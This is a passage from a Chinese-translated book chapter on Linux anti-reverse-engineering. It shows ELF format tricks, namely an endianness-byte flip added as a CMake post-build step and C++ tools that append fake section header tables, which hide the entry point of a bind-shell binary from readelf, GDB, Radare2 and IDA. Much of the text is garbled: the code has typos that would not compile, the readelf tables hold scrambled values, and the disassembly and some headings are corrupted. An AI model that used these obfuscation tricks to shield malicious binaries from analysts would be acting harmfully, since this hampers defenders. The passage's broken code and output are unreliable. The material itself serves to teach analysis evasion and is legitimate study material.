Find the GDB manual and other documentation online: <http://www.gnu.org/software/gdb/documentation/>.
For help, type "help". Type "apropos word" to search for commands related to "word"...
/home/albino-lobster/antire_book/chap_3_format_hacks/trouble/build/.trouble": not executable: File format not recognized
```

GDB 以“File format not recognized”拒绝了该执行文件。我现在有点担心`Trouble`无法执行。然而，一个快速测试证明我可以执行`Trouble`，客户端仍然连接到它。

# 第 3 章：文件格式

## Trouble 仍然可用

```
albino-lobster@ubuntu:-$ nc 127.0.0.1 8760
The bind shell password is: lu0NwoGb2CtAeqcwiHe8GNJcXRu
exit
```

看来翻转一个位让`readelf`和 GDB 无法工作。让我们看看我们喜爱的反汇器表现如何。

## 用字节序谎言欺骗 Radare2

```
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 ./trouble
Warning: Cannot initialize program headers
Warning: Cannot initialize section headers
Warning: Cannot initialize strings table
Warning: Cannot initialize dynamic strings
Warning: Cannot initialize dynamic section
Warning: read (init_offset)
Warning: read (get_fini)
pdf: Cannot find function 'entry' at 0xf20240000000000
Analyze all flags starting with entry
Warning: Searching xrefs in non-executable regions
Analyze len bytes of instructions for references
Oops invalid range calls
Analyze function calls
Use -A to perform additional analysis.
Constructing a function name for entry.* and func.* functions
pdf: Cannot find function at 0xf20240000000000
```

好吧，Radare2 也坏了。我也尝试了 Hopper，但它什么都没有显示……从反逆工程的角度来看，这很棒，因为用户没有关于哪里出了问题的提示。

IDA 的响应很有趣。它首先显示这条错误信息：

![](img/fdf1e4bfff399dc5a8580eb0fa23e5_87_0.png)

“IDA 对字节序谎言的错误信息”

这个拼写错误让我内心的小级学生感到很快，但我确定他们意思是“第六个字节”。然而，在点击“是”继续后，IDA 成功反汇编了整个文件。看来 IDA 有备用方法来确定真实的字节序。

尽管 IDA 泼了冷水，但这似乎是一个实用的小混淆手段，也很添加到我们的构建过程中。只需在`Trouble`的`CMakeLists.txt`末尾添加以下行即可。

## 插入字节序谎言的 CMake 命令

```
add_custom_command(TARGET ${PROJECT_NAME}
    POST_BUILD
    COMMAND echo 'Ag===' | base64 -d | dd conv=notrunc of=${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME} bs=1 seek=5)
```

## echo ‘Ag==’ | base64-d

你可能会想：“插入字节序谎言的 CMake 命令是怎么回事？”有趣的故事是，CMake 不喜欢在`add_custom_command()`函数中使用反斜杠，我没有找到解决办法。我尝试过直接选择`\x02`的 UTF-8 表示，但那破坏了这本书的版本跟踪系统。我最终决定对`echo -ne '\x02'`进行 base64 解码。

当带有新的 EI_DATA 混淆重新编译`Trouble`时，看起来应该是这样的：

## 使用 EI_DATA 混淆编译 Trouble

```
albino-lobster@ubuntu:~/antire-book/chap_3_format_hacks/trouble/build$ make clean; make
```

```
-- Configuring done
-- Generating done
```

```
-- Build files have been written to: /home/albino-lobster/antire_book/chap_3_format_hacks/trouble/build
```

```
Scanning dependencies of target trouble
[ 50%] Building C CMakeFiles/trouble.dir/src/trouble.c.o
[100%] Linking C executable
The bind shell password is: lu0NwoGb2CtAeqcwiHe8GNJcXRu
1+0 records in
1+0 records out
1 byte copied, 4.1259e-05, 24.2 kB/s
[100%] Built target trouble
```

# 第 3 章：文件格式技巧

## 去除二进制符号后的 Trouble 视图

```bash
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a .t/
```

ELF Header:

Magic:    7f 45 4c 46 45 02 01 00 00 00 00 00 00 00

Class:    ELF64

Data:     2 补码，小端

Version: 1 (current)

OS/ABI:  UNIX - System V

ABI Version: 0

Type:    EXEC (可执行文件)

Machine: Advanced Micro Devices X86-64

Version: 0x1

Entry point address: 0x40022

Start of program headers: 64 (相对于文件的字节)

Start of section headers: 0 (相对于文件的字节)

Flags:    0x0

Size of this header: 64 (字节)

Size of program headers: 56 (字节)

Number of program headers: 4

Size of section headers: 64 (字节)

Number of section headers: 0

Section header string index: 0

该文件中没有节（sections）。

该文件中没有需要分组的节。

该文件中没有动态节（dynamic section）。

该文件中没有重定位（relocations）。

不支持机器类型 Advanced Micro Devices X86-64 的展开节（unwind sections）。

没有用于显示符号的动态符号信息。

文件中未找到版本信息。

有四个程序头描述了`Trouble`的地址空间。程序头的一个重要部分是“flags”（标志）字段。该字段描述了段段是否可执行、可写或可读。在`Trouble`的四个程序头中，有一个只读（“r”），两个可读可写（“rw”），以及一个可读可执行（“re”）。反汇编器使用“flags”字段进行分析吗？让我们实验一下。

尝试创建一个伪造的节头表，反转程序头的“flag”字段。这会让反汇编器乐意地认为，第一个 LOAD 段描述的空间是不可执行的，而第二个 LOAD 段描述的空间是可执行的。节头表将包含四个项：

- 1. `SHT_NULL`节头。这通常位于节表的开头，如果漏掉它会看起来很奇怪。
- 2. `SHT_PROGBITS`节。在这个节中，你将地址设置为覆盖第一个 LOAD 段。然而，它不像第一个 LOAD 那样是“re”，而是像第二个 LOAD 那样是“rw”。节名为“data”，这样它看起来就像一个普通的数据节。
- 3. 另一个`SHT_PROGBITS`节。在这个节中，你将地址设置为覆盖第二个 LOAD 段。这次将段标记为“re”而不是“rw”。该节的名字应该是“text”，因为它看起来像是一个代码段。
- 4. 一个`SHT_STRTAB`节。该节将指向文件末尾，你将在那里追加一个新的节名称名称列表。

我在第三章中包含了恰好执行这些操作的代码。该项目名为“fakeHeadersXBit”。该项目同样包含两个文件：`CMakeLists.txt`和`fakeHeadersXBit.cpp`。

`chap_3_format_hacks/fakeHeadersXbit/CMakeLists.txt`

```cmake
project(fakeHeadersXbit CXX)
cmake_minimum_required(VERSION 3.0)
```

```cmake
set(CMAKE_FLAGS "-Wall -Wextra -Wshadow")
add_executable(${PROJECT_NAME} src/fakeHeadersXbit.cpp)
```

`fakeHeadersXbit.cpp`



```cpp
#include <cstddef>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <cstring>
#include <elf.h>

/**
 * 该工具的目标是误导反汇编器，使其认为代码部分是数据，而数据部分是可以执行的。
 * 该工具将为没有节表的文件添加节表。
 * 节表将由4个头组成：
 * - 空头
 * - .data：覆盖 .text，但我们取消 X 并设置 W
 * - .text：覆盖 .data，但我们设置 X 并取消 W
 * - .shstrtab：字符串表
 * 这段代码假设二进制文件有 PF_LOAD 段。
 * 一个段设置了 PF_X，另一个设置了 PF_W。
 * 修改 ELF 头以指示有 6 个节头，并且字符串表是最后一个。
 */
bool edit_elf_header(std::string& p_data)
{
    if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||
        p_data[3] != 'F')
    {
        return false;
    }

    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr>(&p_data[0]);

    if (ehdr->e_shoff != 0)
    {
        std::cerr << "二进制文件已有节表。" << std::endl;
        return false;
    }

    if (ehdr->e_hent != sizeof(Elf64_Shdr))
    {
        std::cerr << "意外的节头" << std::endl;
        return false;
    }

    ehdr->e_shoff = p_data.size();
    ehdr->e_shnum = 4;
    ehdr->e_shstrnd = 3;
    return true;
}

/**
 * 查找 PF_X 段并创建一个名为 .data 的不含 X 位的节头。
 * @param[in,out] p_data ELF 二进制文件
 * @param[in,out] p_strings 节表字符串
 * @return 未遇到错误
 */
bool add_data_section(std::string& p_data, std::string& p_strings)
{
    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr>(&p_data[0]);
    Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr>(&p_data[0] + ehdr->e_phoff);

    for (int i = 0; i < ehdr->e_phnum; i++, phdr++)
    {
        if (phdr->p_type == PT_LOAD)
        if ((phdr->p_flags & PF_X) == PF_X)
        {
            Elf64_Shdr data_header = {};
            data_header.sh_name = p_strings.size();
            data_header.sh_type = SHT_PROGBITS;
            data_header.sh_flags = SHF_ALLOC | SHF_WRITE;
            data_header.sh_addr = phdr->p_addr;
            data_header.sh_offset = phdr->p_offset;
            data_header.sh_size = phdr->p_filesz;
            data_header.sh_link = 0;
            data_header.sh_info = 0;
            data_header.sh_align = 4;
            data_header.sh_entsize = 0;
            p_strings.append(".data");
            p_strings.push_back('\x00');
            p_data.append(reinterpret_cast<char*>(&data_header), sizeof(data_header));
            return true;
        }
    }
    return false;
}

/**
 * 查找 PF_W 段并创建一个名为 .text 的具有 X 位的节头。
 * @param[in,out] p_data ELF 二进制文件
 * @param[in,out] p_strings 节表字符串
 * @return 未遇到错误
 */
bool add_text_section(std::string& p_data, std::string& p_strings)
{
    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr>(&p_data[0]);
    Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr>(&p_data[0] + ehdr->e_phoff);

    for (int i = 0; i < ehdr->e_phnum; i++, phdr++)
    {
        if (phdr->p_type == PT_LOAD)
        if ((phdr->p_flags & PF_X) == 0)
        {
            Elf64_Shdr text_header = {};
            text_header.sh_name = p_strings.size();
            text_header.sh_type = SHT_PROGBITS;
            text_header.sh_flags = SHF_ALLOC | SHF_EXECINSTR;
            text_header.sh_addr = phdr->p_addr;
            text_header.sh_offset = phdr->p_offset;
            text_header.sh_size = phdr->p_filesz;
            text_header.sh_link = 0;
            text_header.sh_info = 0;
            text_header.sh_align = 4;
            text_header.sh_entsize = 0;
            p_strings.append(".text");
            p_strings.push_back('\x00');
            p_data.append(reinterpret_cast<char*>(&text_header), sizeof(text_header));
            return true;
        }
    }
    return false;
}
```

# 第 3 章：文件格式技巧

`inputFile.close();`

```cpp
if (edit_elf_header(input))
{
    return EXIT_FAILURE;
}
if (append_sections(input))
{
    return EXIT_FAILURE;
}
```

```cpp
std::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);
if (!outputFile.open() || !outputFile.good())
{
    std::cerr << "Failed to open the provided file: " << p_argv[1] << std::endl;
    return EXIT_FAILURE;
}
```

```cpp
outputFile.write(input.data(), input.length());
outputFile.close();
return EXIT_SUCCESS;
```

像常一样，使用 CMake 编译 `fakeHeadersXBit`。

编译 `fakeHeadersXBit`：

```bash
albino-lobster@ubuntu:~/antire_book$ cd chap_3_format_hacks/fakeHeadersXBit/
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXBit/build$ mkdir build
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXBit/build$ cmake \
```

```text
-- The CXX compiler identification is GNU 5.4.0
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
```

# 第 3 章：文件格式技巧

-- 构建文件已写入到： `/home/albino-lobster/antire_book/chap_3_format_hacks/FakeHeadersXBit/build`

```bash
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXBit/build$ make
```

```text
Scanning dependencies of target fakeHeadersXBit
[ 50%] Building CXX object CMakeFiles/fakeHeadersXBit.dir/src/fakeHeadersXBit.cpp.o
[100%] Linking CXX executable fakeHeadersXBit
[100%] Built target fakeHeadersXBit
```

```bash
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXBit/build$
```

之前你使用 `stripBinary` 工具编译并删除了节头部表。现在你可以使用 `fakeHeadersXBit` 添加节头部表。

### 为 Trouble 添加一个伪节段

```bash
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXBit/build$ ./fakeHeadersXBit ~/antire_book/chap_3_format_hacks/trouble/build/trouble
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXBit/build$
```

输出并不非常有趣，但请看看 Trouble 发生了什么。

### 带有 fakeHeadersXBit 节头部表的 Trouble



## 第 3 章：文件格式技巧

### 更新后的 `edit_elf_header()`

```cpp
bool edit_elf_header(std::string& p_data)
{
    if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||
        p_data[3] != 'F')
    {
        return false;
    }
    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);
    if (ehdr->e_shoff != 0)
    {
        std::cerr << "The binary already has a section table." << std::endl;
        return false;
    }
    if (ehdr->e_shsize != sizeof(Elf64_Ehdr))
    {
        std::cerr << "Unexpected section size" << std::endl;
        return false;
    }
    ehdr->e_shoff = p_data.size();
    ehdr->e_shnum = 6;
    ehdr->e_shstr = 5;
    return true;
}
```

### 更新后的 `add_data_section()`

```cpp
bool add_data_section(std::string& p_data, std::string& p_strings)
{
    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);
    Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->ephoff);
    for (int i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr->p_type == PT_LOAD)
        {
            if ((phdr->p_flags & PF_X) == PF_X)
            {
                size_t entry_physical = 8;
                Elf64_Shdr init_header = {};
                init_header.sh_name = p_strings.size();
                init_header.sh_type = SHT_PROGBITS;
                init_header.sh_flags = SHF_ALLOC | SHF_EXECINSTR;
                init_header.sh_addr = phdr->p_vaddr;
                init_header.sh_offset = phdr->p_offset;
                init_header.sh_size = entry_physical;
                init_header.sh_link = 0;
                init_header.sh_info = 0;
                init_header.sh_align = 4;
                init_header.sh_entsize = 0;
                p_strings.append(".init");
                p_strings.push_back('\0');
                p_data.append(reinterpret_cast<char*>(&init_header), sizeof(init_header));
                Elf64_Shdr data_header = {};
                data_header.sh_name = p_strings.size();
                data_header.sh_type = SHT_PROGBITS;
                data_header.sh_flags = SHF_ALLOC | SHF_WRITE;
                data_header.sh_addr = phdr->p_vaddr + entry_physical + 1;
                data_header.sh_offset = phdr->p_offset + entry_physical + 1;
                data_header.sh_size = phdr->p_filesz - (entry_physical + 1) - 8;
                data_header.sh_link = 0;
                data_header.sh_info = 0;
                data_header.sh_align = 4;
                data_header.sh_entsize = 0;
                p_strings.append(".data");
                p_strings.push_back('\0');
                p_data.append(reinterpret_cast<char*>(&data_header), sizeof(data_header));
                Elf64_Shdr fini_header = {};
                fini_header.sh_name = p_strings.size();
                fini_header.sh_type = SHT_PROGBITS;
                fini_header.sh_flags = SHF_ALLOC | SHF_WRITE;
                fini_header.sh_addr = phdr->p_vaddr + phdr->p_filesz - 8;
                fini_header.sh_offset = phdr->p_offset + phdr->p_filesz - 8;
                fini_header.sh_size = 8;
                fini_header.sh_link = 0;
                fini_header.sh_info = 0;
                fini_header.sh_align = 4;
                fini_header.sh_entsize = 0;
                p_strings.append(".fini");
                p_strings.push_back('\0');
                p_data.append(reinterpret_cast<char*>(&fini_header), sizeof(fini_header));
                return true;
            }
        }
    }
    return false;
}
```

重新编译 `fakeHeaders`。使用 `strip` 移除 Trouble 中的真实节表，然后使用 `fakeHeaders` 附加伪节表。如果你操作成功，`readelf` 的输出应该是（带有更新 `fakeHeaders` 的 Trouble）：

```bash
lobster@ubuntu:~/ant_book/chap3_format_hacks$ readelf -a ../trouble
ELF Header:
Magic: 7f 45 4c 46 02 01 00 00 00 00
Class: 2, little endian
Data: Version: 1 (current)
OS/ABI: UNIX V ABI: 0
Type: EXEC (Executable file)
Machine: Advanced Micro X86-64
```

---

```bash
albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a trouble
ELF Header:
Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 ELF64
Data: 2's complement, little endian
Version: 1 (current)
OS/ABI: UNIX - System V
ABI Version: 0
Type: EXEC (Executable file)
Machine: Advanced Micro Devices X86-64
Version: 0x1
Entry point address: 0x4002f2
Start of program headers: 0x64 (bytes)
Start of section headers: 9560 (bytes)
Flags: 0x0
Size of this header: 64 (bytes)
Size of program headers: 56 (bytes)
Number of program headers: 4
Size of section headers: 64 (bytes)
Number of section headers: 4
Section header string index: 3
```

### Section Headers:

| [Nr] | Name | Type | Address | Size | EntSize | Link | Align |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| [ 0 ] | NULL | | 000000000000 | 000000000000 | | 0 | 0 |
| [ 1 ] | .data | PROBITS | | 000000000000 | 000000004000 | 0 | 0 |
| [ 2 ] | .text | PROBITS | WA | 00000000001c | 0000000061fe8 | 00001fe8 | 0 | 4 |
| [ 3 ] | .shstrab | STRTAB | AX | 000000000000 | 000000000000 | 00002658 | 0 | 4 |

### Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), l (large), I (info), L (link), G (group), T (TLS), E (exclude), x (unknown), O (OS processing), p (processor specific)。文件中没有节组 (groups)。

### Program Headers:

| Type | Offset | VirtAddr | PhysAddr | FileSize | MemSize | Flags | Align |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| LOAD | 0000000000000000 | 0000000000004000 | 0000000000004000 | 0 | 0 | | |
| LOAD | 00000000000001c1 | 00000000000001c1 | 00000000000001c1 | 0 | 0 | R | 2000 |
| LOAD | 00000000000001fe8 | 00000000000061fe8 | 00000000000061fe8 | 0 | 0 | | |
| LOAD | 0000000000000178 | 0000000000000178 | 0000000000000178 | 0 | 0 | RW | |
| GNU_STACK | 0000000000000000 | 0000000000000000 | 0000000000000000 | 0 | 0 | RW | 10 |
| GNU_RELRO | 00000000000001fe8 | 00000000000061fe8 | 00000000000061fe8 | 0 | 0 | | |
| GNU_HEADER | 0000000000000018 | 0000000000000018 | 0000000000000018 | 0 | 0 | R | |

### Section to Segment mapping:

00 .data
01 .text
02

文件中没有动态节 (dynamic section)。文件中没有重定位 (relocations)。不支持对 Advanced Micro Devices X86-64 机器的 unwind 节 (unwind sections)。文件中未找到版本信息。`readelf` 显示了 `fakeHeaders` 添加的四个节头部。现在问题是：“这有什么影响？”

在应用伪表之前，IDA 在 Trouble 中发现了 54 个函数，导航栏看起来是完整的。然而，当 IDA 分析应用 `fakeHeadersXBit` 的 Trouble 时，它只找到了 22 个函数，且导航栏显示有大量的分析缺失。

![](img/fdf1e4bfff395dc5a8580eb0fa23e5_99_0.png) > "没有节段的 Trouble 导航栏"

![](img/fdf1e4bfff395dc5a8580eb0fa23e5_99_1.png) > "带有伪表的 Trouble 导航栏"

为什么 IDA 失败了？考虑反汇编中的入口点。

### Trouble 的入口点

```assembly
LOAD:0000000000000000
0:000000000000222
::000000000000222proc near              ; DATA XREF: start+1C
LOAD:0000000000400222            rbp, rbp
LOAD:00000000004002F      mov      rdx, 09
LOAD:0000000000402F8      pop      rsi
LOAD:0000000000400F9      mov      rspx, rsp
LOAD:0000000000000FC      and      rsp, 0xFFFFFF
LOAD:000000000040300      mov      r8, offset _term_proc
LOAD:000000000040307      mov      rcx, offset _init_proc
LOAD:00000000004030E      mov      sub_400130
LOAD:000000000040315      call     sub_40056
```

在 `0x4003e` 处，你应该注意到地址 `0x4130` 被移动到了 `rdi`。该地址是 `main()` 函数的开头。通常，IDA 会这样反汇编 `main()`：

### main 的反汇编

```assembly
LOAD:0000000000400130 sub_400130proc near              ; DATA XREF: start+1C
LOAD:0000000000400130
LOAD:0000000000400130 var_68      = qword ptr -68h
LOAD:0000000000400130 var_58      = qword ptr -58h
LOAD:0000000000400130 var_50      = qword ptr -50h
LOAD:0000000000400130 var_48      = byte ptr -48h
LOAD:0000000000400130 var_20      = qword ptr -20h
LOAD:0000000000400130
LOAD:0000000000400130      push     rbp
LOAD:0000000000400131      push     rbx
LOAD:0000000000400132      mov      rdx, 6
LOAD:0000000000400133      mov      esi, 5
LOAD:0000000000400134      mov      edx, 4
LOAD:0000000000400135      mov      ebp, rbp
LOAD:0000000000400136      mov      rbp, rsp
LOAD:0000000000400137      mov      edi, 1
```

`main()` 的反汇编从未被执行。



Version: 0x1

Entry point address: 0x408f2

Start of program headers: 64 (bytes into file)

Start of section headers: 9560 (bytes into file)

Flags: 0x0

Size of header: 64 (bytes)

Size of program headers: 56 (bytes)

Number of program headers: 4

Size of section headers: 64 (bytes)

Number of section headers: 6

Section header string table: 5

### Section Headers:

| Nr | Name | Type | Address | Offset | Flags | Info | Align |
|---|---|---|---|---|---|---|---|
| 0 | | NULL | 0000000000000000 | 0 | 0 | 0 | 0 |
| 1 | .init | PROGBITS | 0000000000000000 | 000000000400000 | AX | 0 | 0 |
| 2 | .data | PROGBITS | 000000000000010b | 0000000000000009 | WA | 0 | 4 |
| 3 | .fini | PROGBITS | 000000000040c1c4 | | 0 | 4 | |
| 4 | .text | | 000000000601fe8 | AX | 00000001fe8 | | |
| 5 | .shstrtab | STRTAB | 00000000000026d8 | | 0 | 4 | |

Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), l (large info), L (link order), G (group), T (TLS), E (exclude), x (unknown extra OS processing required), o (OS specific), p (processor specific)

该文件中没有节组（section groups）。

| Type | Offset | VirtAddr | PhysAddr | FileSize | MemSize | Flags | Align |
|---|---|---|---|---|---|---|---|
| LOAD | 0x0000000000000000 | 0x000000000040000 | 0x0000000000000000 | | 200000 | | |
| | | 0x00000000000001c1 | 0x0000000000000cc | | E | | |
| LOAD | 0x00000000000001fe8 | 0x000000000601fe8 | | | RW | 200000 | |
| | | 0x0000000000000178 | 0x0000000000004b4 | | RW | | |
| GNU_STACK | 0x0000000000000000 | 0x0000000000000000 | | | RW | 10 | |

# 第3章：文件格式黑 de

## 105

```cpp
init_header.sh_info = 0;
init_header.sh_addralign = 4;
init_header.sh_entsize = 0;
p_strings.append(".init");
p_strings.push_back('\x00');
p_data.append(reinterpret_cast<char*>(&init_header),
    sizeof(init_header));
```

```cpp
Elf64_Shdr data_header = {};
data_header.sh_name = p_strings.size();
data_header.sh_type = SHT_PROGBITS;
data_header.sh_flags = SHF_ALLOC | SHF_WRITE;
data_header.sh_addr = phdr->p_vaddr + entry_physical + 1;
data_header.sh_offset = phdr->p_offset + entry_physical + 1;
data_header.sh_size = phdr->p_filesz - (entry_physical + 1) - 8;
data_header.sh_link = 0;
data_header.sh_info = 0;
data_header.sh_addralign = 4;
data_header.sh_entsize = 0;
p_strings.append(".data");
p_strings.push_back('\x00');
p_data.append(reinterpret_cast<char*>(&data_header),
    sizeof(data_header));
```

```cpp
Elf64_Shdr fini_header = {};
fini_header.sh_name = p_strings.size();
fini_header.sh_type = SHT_PROGBITS;
fini_header.sh_flags = SHF_ALLOC | SHF_WRITE;
fini_header.sh_addr = phdr->p_vaddr + phdr->p_filesz - 8;
fini_header.sh_offset = phdr->p_offset + phdr->p_filesz - 8;
fini_header.sh_size = 8;
fini_header.sh_link = 0;
fini_header.sh_info = 0;
fini_header.sh_addralign = 4;
fini_header.sh_entsize = 0;
p_strings.append(".fini");
p_strings.push_back('\x00');
p_data.append(reinterpret_cast<char*>(&fini_header),
    sizeof(fini_header));
```

```cpp
return true;
```

```cpp
return false;
}
```

重新编译 Trouble 和 fakeHeadersXBit。使用 `stripBinary` 移除 Trouble 的节区头部，并使用 `fakeHeadersXBit` 应用伪节区头部表。如果你查看 Trouble 中的节区头部，你会发现 `.init` 节变得大了很多。

### Trouble 的伪节区

albino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -S /t/trouble

有 6 个节区头部，从偏移量 0x2558 开始：

# 节区头部 (Section Headers):

| [Nr] | Name | Type | Address | Flags | Link | Info | Offset | Align |
|---|---|---|---|---|---|---|---|---|
| [ 0 ] | | NULL | 0000000000000000 | 0000000000000000 | 0 | 0 | 00000000 | |
| [ 1 ] | .init | PROGBITS | 00000000000002f3 | 0000000000000000 | AX | 0 | 0 | 00000000 |
| [ 2 ] | .data | PROGBITS | 0000000000000400 | 0000000000002f4 | WA | 0 | 0 | 000002f4 |
| [ 3 ] | .fini | PROGBITS | 0000000000000192 | 0000000000000410 | WA | 0 | 0 | 00001c14 |
| [ 4 ] | .text | PROGBITS | 0000000000000178 | 0000000000000fe8 | AX | 0 | 4 | 00001fe8 |
| [ 5 ] | .shstrtab | STTAB | 0000000000000023 | 0000000000000000 | | 0 | 4 | 000026d8 |

标志位 (Key to Flags):

W (write), A (alloc), X (execute), M (merge), S (strings), l (large), K (link), G (group), T (TLS), E (exclude), p (processor specific)

将新版本的 Trouble 加载到 IDA 中。第一个导航栏看起来很正常！！[](img/df1e4bfff39dc5a85eb00fa23e5110.png)

带有节区头部的 Trouble 导航栏，现在你重叠了入口点和 `.init`。

## 第3章：文件格式黑

### 通过重叠入口点和 .init 向 IDA 隐藏入口

```
.init:00000000000040F0    db 2dup(@
.init:00000000000040F2    public start
.init:00000000000040F2    db 48h
.init:00000000000040F2    _init ends
.data:00000000000040F2    ====================
.data:00000000000040F4    Segment type: Pure data
.data:00000000000040F4    Segment permissions: Read/Write
.data:00000000000040F4    _data segment 'DATA' use64
.data:00000000000040F4    assume cs:data
.data:00000000000040F4    .org 4002h
.data:00000000000040F4    db ED ; f
.data:00000000000040F5    db 49h ; I
```

因为 IDA 在 `.init` 的边界处停止，所以它无法解析入口点。由于你也修改了执行标志，IDA 无法解析任何其他内容。

## 隐藏入口点

在上一节中，你通过修改节区头部的 `size` 属性阻止了 IDA 解析入口点。在本节中，你将学习另一种完全隐藏入口的方法。考虑 C 语言中的节区头部。

### 64位 ELF 节区头部

```c
struct Elf64_Shdr
{
    uint32_t sh_name;
    uint32_t sh_type;
    uint64_t sh_flags;
    Elf64_Addr sh_addr;
    Elf64_Off sh_offset;
    uint64_t sh_size;
    uint32_t sh_link;
    uint32_t sh_info;
    uint64_t sh_addalign;
    uint64_t sh_entsize;
}
```

这种技术涉及三个字段：`sh_addr`（虚拟地址）、`sh_offset`（物理偏移）和 `sh_size`。同样重要的是，ELF 头部中的入口地址是虚拟地址。

现在假设你有一个虚拟地址并想在文件中查找实际位置。查看节区头部，找到地址落在 `sh_addr` 和 `sh_addr + sh_size` 范围内的哪个节。一旦找到了该节，你就可以通过减去 `sh_addr` 并加上 `sh_offset` 来计算虚拟地址的物理偏移。你现在应该知道虚拟地址在文件中的精确偏移。

但是，如果我们给 `sh_addr` 一个错误的值呢？这是如何破坏计算的？假设有如下值：

```
virtual_address = 0x4002f0
sh_addr = 0x400000
sh_size = 0x00800
sh_offset = 0
```

通常情况下，你可以在文件中的 0x4002f0 字节处找到它 ((0x4002f0 - 0x400000) + 0)。但如果你引入了一个谎言并设置 `sh_addr = 0x400010`，计算就会改变。现在的结果是 0x4002f0 是文件中的 0x2e0 字节处。

## 第3章：文件格式黑

这是一个用于隐藏入口点的技术。如果你添加了一个伪节区头部表并更改包含入口点的节基地址，那么任何完全依赖节头部头部部的汇器将无法在文件中正确找到入口点。

我写了一些代码你可以进一步检查。项目名为 `fakeHeadersHideEntry`，可以在章节目录下找到。有两个文件：`CMakeLists.txt` 和 `fakeHeadersHideEntry.cpp`。

### chap_3_format_hacks/fakeHeadersHideEntry/CMakeLists.txt

```
project(fakeHeadersHideEntry CXX)
cmake_minimum_required(VERSION 3.0)

set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow")
add_executable($${PROJECT_NAME} src/fakeHeadersHideEntry.cpp)
```

### chap_3_format_hacks/fakeHeadersHideEntry/src/fakeHeadersHideEntry.cpp

```cpp
#include <cdef>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <cstring>
#include <ctime>
#include <elf.h>
```

```cpp
/*
 * 修改 ELF 头部以指示有 4 个节，且字符串表是最后一个。
 * \param[in,out] p_data ELF 二进制文件
 * \return 如果可以添加节表则返回 true，否则返回 false
 */
```

```cpp
bool edit_elf_header(std::string& p_data)
{
    if (p_data[0] != 0x7 || p_data[1] != 'E' || p_data[2] != 'L' ||
        p_data[3] != 'F')
    {
        return false;
    }

    Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);

    if (ehdr->e_shoff != 0)
    {
        std::cerr << "该二进制文件已有节区表。" << std::endl;
        return false;
    }

    if (ehdr->e_shentsize != sizeof(Elf64_Shdr))
    {
        std::cerr << "意外的节头部大小" << std::endl;
        return false;
    }

    ehdr->e_shoff = p_data.size();
    ehdr->e_shnum = 4;
    ehdr->e_shstrnd = 3;
    return true;
}
```

```cpp
/*
 * 寻找 PF_X LOAD 段并创建对应的节头部。
 * 修改基地址以干扰任何仅依赖节头部的反汇编器。
 * \param[in,out] p_data ELF 二进制文件
 * \param[in,out] p_strings 节表字符串名称
 */
```

```cpp
/*
 * 此工具假设二进制文件有两个 PF_LOAD 段。一个段设置了 PF_X，另一个段设置了 PF_W。
 */
```

## 第3 章：文件格式破解技巧

* 如果没有遇到错误，则返回 true

* bool add_data_section(std::string& p_data, std::string& p_strings)



## 第 3 章：文件格式破解技巧

```cpp
Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);
Elf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);
for (int i = 0; i < ehdr->e_phnum; i++, phdr++) {
    if ((phdr->p_flags & PF_X) == PF_X) {
        Elf64_Shdr data_header = {};
        data_header.sh_name = p_strings.size();
        data_header.sh_type = SHT_PROBITS | SHF_EXECINSTR;
        // "random" 每次运行创建一个不同的偏移量
        srand((unsigned)time(0));
        int base = rand() % 250;
        data_header.sh_addr = phdr->p_vaddr + base;
        data_header.sh_offset = phdr->p_offset;
        data_header.sh_size = phdr->p_filesize - base;
        data_header.sh_link = 0;
        data_header.sh_info = 0;
        data_header.sh_align = 4;
        data_header.sh_entsize = 0;
        p_strings.append(".text");
        p_strings.push_back('\x00');
        p_data.append(reinterpret_cast<char*>(&data_header), sizeof(data_header));
        return true;
    }
}
return false;
```

这会找到 `PF_W` 段并创建一个名为 `.data` 的匹配节标头。

- `@param[in,out] p_data` ELF 二进制文件
- `@param[in,out] p_strings` 节表字符串名称
- 如果没有遇到错误，则返回 `true`

```cpp
/*
bool add_text_section(std::string& p_data, std::string& p_strings)
{
